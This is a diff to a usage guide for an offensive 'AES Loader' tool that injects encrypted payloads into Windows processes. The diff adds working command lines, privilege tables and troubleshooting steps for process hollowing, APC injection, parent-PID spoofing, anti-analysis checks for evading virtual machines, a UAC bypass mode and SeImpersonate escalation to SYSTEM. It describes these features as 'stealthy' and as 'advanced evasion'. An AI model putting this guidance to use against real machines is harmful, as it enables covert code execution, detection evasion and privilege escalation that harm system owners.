@@ -1,5 +1,55 @@
 # AES Loader - Complete Usage Guide
 
+## IMPORTANT NOTES
+
+### Privilege Requirements by Feature
+
+| Feature | Minimum Privilege | Note |
+|---------|-------------------|------|
+| DEFAULT mode (spawn + APC) | User | Works fine as NETWORK SERVICE |
+| HOLLOW mode (default) | User | Works fine as NETWORK SERVICE |
+| HOLLOW with `-f` (custom process) | User | **MUST use full path** (see Path Requirements below) |
+| PPID Spoofing (`--ppid`) | **ADMIN** | Requires elevated privileges to OpenProcess parent |
+| APC into system process | User/ADMIN | Depends on target process - system processes need ADMIN |
+| SeImpersonate escalation (`-i`) | User with SeImpersonate | Elevates to SYSTEM (see separate section) |
+
+### Path Requirements for `-f` (Custom Process)
+
+**svchost.exe is special:**
+```bash
+./loader.exe -m hollow -f svchost.exe        # ✅ WORKS - found via system PATH
+```
+
+**Other processes REQUIRE full path:**
+```bash
+./loader.exe -m hollow -f calc.exe           # ❌ FAILS (error 2 - file not found)
+./loader.exe -m hollow -f c:\windows\system32\calc.exe  # ✅ WORKS
+./loader.exe -m hollow -f c:\windows\system32\notepad.exe  # ✅ WORKS
+```
+
+### Admin Privilege Scenarios
+
+**These require ADMIN (elevated) shell:**
+- PPID Spoofing with `--ppid` - needs to open parent process
+- APC injection into system processes (explorer, spoolsv, etc.)
+- Any injection when running as standard user against protected processes
+
+**Examples that will FAIL without admin:**
+```bash
+./loader.exe --ppid 500 -v                   # ❌ Error 5 (needs admin)
+./loader.exe -m apc -p 500 -v                # ❌ May fail if target is protected
+./loader.exe -m hollow -f explorer.exe --ppid 500  # ❌ Error 5 (needs admin)
+```
+
+**Same examples WORK with admin:**
+```bash
+(admin shell) > .\loader.exe --ppid 500 -v   # ✅ WORKS
+(admin shell) > .\loader.exe -m apc -p 500 -v  # ✅ WORKS
+(admin shell) > .\loader.exe -m hollow -f c:\windows\system32\explorer.exe --ppid 500  # ✅ WORKS
+```
+
+---
+
 ## Overview
 
 The AES Loader supports 4 operational modes:
@@ -21,6 +71,7 @@ The AES Loader supports 4 operational modes:
 - Spawns svchost.exe process suspended
 - APC injects encrypted payload into spawned process
 - Simple and stealthy, no flags needed
+- **Privilege Requirement**: User privileges OK
 
 ### With Verbose Output
 ```bash
@@ -29,6 +80,7 @@ The AES Loader supports 4 operational modes:
 **Behavior:**
 - Same as above but with detailed debug logging
 - Shows cipher initialization, payload detection, section writes, etc.
+- **Privilege Requirement**: User privileges OK
 
 ### With PPID Spoofing
 ```bash
@@ -38,7 +90,8 @@ The AES Loader supports 4 operational modes:
 - Spawns svchost.exe with spoofed parent process (PPID: 1152)
 - APC injects payload
 - Parent process will appear as the spoofed PID in Process Explorer
-- Requires: Target parent process must exist and be accessible
+- **Privilege Requirement**: **ADMIN required** (OpenProcess on parent)
+- **Requirements**: Target parent process must exist and be accessible
 
 ### With Anti-Analysis
 ```bash
@@ -47,6 +100,7 @@ The AES Loader supports 4 operational modes:
 **Behavior:**
 - Runs anti-analysis checks (VM detection, timing verification)
 - Spawns svchost.exe + APC inject + verbose logging
+- **Privilege Requirement**: User privileges OK
 
 ---
 
@@ -65,25 +119,34 @@ The AES Loader supports 4 operational modes:
 - Updates PEB ImageBase
 - Sets thread entry point (RCX register)
 - Resumes process execution
+- **Privilege Requirement**: User privileges OK
 
-### Hollow Custom Process
+### Hollow Custom Process (FULL PATH REQUIRED)
 ```bash
-./loader.exe -m hollow -f notepad.exe -v
+./loader.exe -m hollow -f c:\windows\system32\calc.exe -v
 ```
+**IMPORTANT - Path Requirements:**
+- Must use **FULL ABSOLUTE PATH** for custom processes (except svchost.exe)
+- `./loader.exe -m hollow -f calc.exe` → FAILS (error 2 - file not found)
+- `./loader.exe -m hollow -f c:\windows\system32\calc.exe` → WORKS
+- svchost.exe is special case - found via system PATH
+
 **Behavior:**
-- Hollow notepad.exe instead of svchost.exe
+- Hollow specified process instead of svchost.exe
 - Full PE injection with proper initialization
 - Useful for spoofing program execution
+- **Privilege Requirement**: User privileges OK
 
 ### Hollow with PPID Spoofing
 ```bash
-./loader.exe -m hollow -f explorer.exe --ppid 500 -v
+./loader.exe -m hollow -f c:\windows\system32\explorer.exe --ppid 500 -v
 ```
 **Behavior:**
 - Hollow explorer.exe process
 - Parent process spoofed to PID 500
 - Process tree will show custom parent relationship
 - Advanced evasion technique
+- **Privilege Requirement**: ADMIN required (OpenProcess on parent needs elevated rights)
 
 ---
 
@@ -104,7 +167,16 @@ The AES Loader supports 4 operational modes:
 ### Important Requirements
 - `-p PID` is **required** for APC mode
 - Target process must be accessible
-- Must have sufficient privileges
+- **Privilege Requirement**:
+  - User privileges OK for user-owned processes
+  - **ADMIN required** for system processes or protected processes
+
+### Access Denied Troubleshooting
+```bash
+./loader.exe -m apc -p 1464 -v
+[-] OpenProcess failed: error 5
+```
+**Error 5 = ACCESS_DENIED**: Elevation to admin required, or target process is protected
 
 ---
 
@@ -188,9 +260,9 @@ The AES Loader supports 4 operational modes:
 | `-m, --mode` | hollow/apc/uac | Injection mode (default: spawn+apc) |
 | `-v, --verbose` | none | Enable debug output |
 | `-a, --anti` | none | Run anti-analysis checks |
-| `-f, --file` | PATH | Target process (default: svchost.exe) |
+| `-f, --file` | **FULL PATH** | Target process for hollow (default: svchost.exe) - **USE FULL PATH except svchost.exe** |
 | `-p, --pid` | PID | Target PID for APC (required for -m apc) |
-| `--ppid` | PID | Parent PID spoofing |
+| `--ppid` | PID | Parent PID spoofing (**ADMIN required**) |
 | `-c, --cmd` | COMMAND | Custom command for UAC mode |
 | `-h, --help` | none | Show help |
 
@@ -215,17 +287,40 @@ The loader automatically detects payload type:
 
 ## ERROR HANDLING
 
+### File Not Found
+```
+./loader.exe -m hollow -f calc.exe
+[-] CreateProcessW failed: error 2
+```
+→ Must use **FULL PATH** for custom processes
+```
+./loader.exe -m hollow -f c:\windows\system32\calc.exe
+```
+
 ### Missing Requirements
 ```
+./loader.exe -m apc
 [-] Mode APC requires -p/--pid
 ```
 → Always use `-p PID` with `-m apc`
 
-### Process Access
+### Access Denied
 ```
+./loader.exe --ppid 500
+[-] OpenProcess (PPID 500) failed: 5
+```
+→ **Error 5 = ACCESS_DENIED**
+→ **ADMIN privileges required** for PPID spoofing
+```
+(admin shell) > .\loader.exe --ppid 500 -v
+```
+
+```
+./loader.exe -m apc -p 1464
 [-] OpenProcess failed: error 5
 ```
-→ Insufficient privileges for target process
+→ Target process requires higher privileges
+→ Try **ADMIN shell** or choose accessible process
 
 ### Invalid Mode
 ```
@@ -235,15 +330,19 @@ The loader automatically detects payload type:
 
 ---
 
-## PRIVILEGE REQUIREMENTS
+## PRIVILEGE REQUIREMENTS MATRIX
 
-| Mode | Requirements |
-|------|--------------|
-| DEFAULT | User privileges OK |
-| HOLLOW | User privileges OK |
-| APC | User privileges (existing process) |
-| UAC | User privileges (escalates to admin) |
-| PPID Spoofing | Admin privileges required |
+| Scenario | User | Admin | Notes |
+|----------|------|-------|-------|
+| `./loader.exe` (default spawn) | ✅ | ✅ | Works fine |
+| `./loader.exe -m hollow` | ✅ | ✅ | Works fine |
+| `./loader.exe -m hollow -f c:\windows\system32\calc.exe` | ✅ | ✅ | Works fine |
+| `./loader.exe --ppid <PID>` | ❌ | ✅ | **NEEDS ADMIN** |
+| `./loader.exe -m hollow --ppid <PID>` | ❌ | ✅ | **NEEDS ADMIN** |
+| `./loader.exe -m apc -p <user_process>` | ✅ | ✅ | Depends on target |
+| `./loader.exe -m apc -p <system_process>` | ❌ | ✅ | **NEEDS ADMIN** |
+| `./loader.exe -m uac` | ✅ | ❌ | Escalates to admin |
+| `./loader.exe -i` (SeImpersonate) | ✅* | ✅ | *Only with SeImpersonate privilege |
 
 ---
 
